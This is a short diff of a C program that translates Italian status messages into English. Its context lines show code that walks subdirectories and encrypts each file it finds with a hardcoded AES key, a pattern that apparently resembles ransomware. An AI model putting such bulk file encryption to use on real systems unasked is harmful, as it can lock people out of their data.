@@ -10,7 +10,7 @@
 void encrypt_file(const char *file_path, const unsigned char *aes_key) {
     FILE *fp = fopen(file_path, "r");
     if (fp == NULL) {
-        printf("Impossibile aprire il file %s per la lettura\n", file_path);
+        printf("Error: cant read %s \n", file_path);
         return;
     }
 
@@ -18,7 +18,7 @@ void encrypt_file(const char *file_path, const unsigned char *aes_key) {
     snprintf(temp_file_path, sizeof(temp_file_path), "%s.temp", file_path);
     FILE *temp_fp = fopen(temp_file_path, "w");
     if (temp_fp == NULL) {
-        printf("Impossibile aprire il file temporaneo %s per la scrittura\n", temp_file_path);
+        printf("Error: cant open %s\n", temp_file_path);
         fclose(fp);
         return;
     }
@@ -71,7 +71,7 @@ int main() {
                             char file_path[1024];
                             snprintf(file_path, sizeof(file_path), "%s/%s", subdir_path, subfile->d_name);
 
-                            printf("Criptando il contenuto di %s:\n", file_path);
+                            printf("Ciphering content of %s:\n", file_path);
                             unsigned char aes_key[] = "fiolisostancobuonanotte";
                             encrypt_file(file_path, aes_key);
                         }
